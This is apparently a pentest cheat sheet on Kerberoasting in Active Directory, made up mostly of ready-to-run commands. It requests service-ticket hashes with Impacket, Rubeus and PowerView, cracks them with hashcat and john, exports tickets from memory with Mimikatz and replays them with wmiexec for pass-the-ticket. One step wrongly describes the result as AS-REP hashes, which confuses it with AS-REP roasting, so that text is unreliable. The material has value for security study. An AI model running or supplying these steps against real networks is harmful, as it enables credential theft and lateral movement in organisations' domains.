# Kerberoasting
This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`.
## **Perform Kerberoasting on Kali:**

**Command Syntax**: Use the following command to request the **TGS** (Ticket Granting Server) and capture the TGS-REP hash:
    
```bash
impacket-GetUserSPNs -request -dc-ip <DomainController_IP>  -outputfile <output_file> <Domain/User>
```
- **-request** to obtain the TGS
Example:
``` shell
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.50 corp.com/ahmed
```
HashShape
```
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$9b161bcb9f98f19b.......a85ee4
```

2. **Result**: This command will send AS-REQ requests to the domain controller and retrieve the AS-REP hashes (if preauthentication is disabled for the user accounts). The hashes are saved in [[Hashcat]] format in the output file (`hashes.asreproast`).
``` shell
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## **Perform Kerberoasting on Windows (joined domain):**
By using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools/GhostPack-Compiled%20Binaries)) 

``` powershell
.\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
```
### Using PowerView to Extract TGS Tickets

``` powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
`Results`
```powershell-session
samaccountname
--------------
krbtgt
userb
```
### Using PowerView to Target a Specific User
```powershell
Get-DomainUser -Identity userb | Get-DomainSPNTicket -Format Hashcat
```

**Remove all spaces and lines in a file:**
``` shell
tr -d '[:space:]' < input_file > output_file
```
**Exporting All Tickets to a CSV File**
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\domain_tgs.csv -NoTypeInformation
```
### Extracting Tickets from Memory with Mimikatz
``` mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export 
```
If we extract only `.kirbi` files and this will happen if we run `mimikatz` automatically without `base64 /out:true` 
##### ---> On kali <---
#### Extract Hashes from `.kirbi` Tickets
``` shell
python3 kirbi2john.py ticket.kirbi > hash.txt
john hash.txt --wordlist=/path/to/wordlist.txt
```
**With Hashcat:** Use Kerberos Ticket Hash mode `13100`:
``` shell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
### Replay Tickets with Impacket
##### 1. Convert .kirbi to CCache
``` shell
python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
```
##### 2. Set Environment Variable for Replay 
If you plan to use the ticket for further lateral movement or pass-the-ticket attacks, set the `KRB5CCNAME` environment variable:
``` shell
export KRB5CCNAME=/path/to/ticket.ccache
```
If you intend to replay the `.kirbi` ticket instead of cracking it, Impacket’s `psexec.py` or `wmiexec.py` can be used.
``` shell
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass DOMAIN/USERNAME@TARGET
```
- The `-k` flag uses the Kerberos ticket.


### On BloodHound we notice it as:

![image](https://github.com/user-attachments/assets/1d4eab33-897d-44a5-b4d3-68aee8275292)
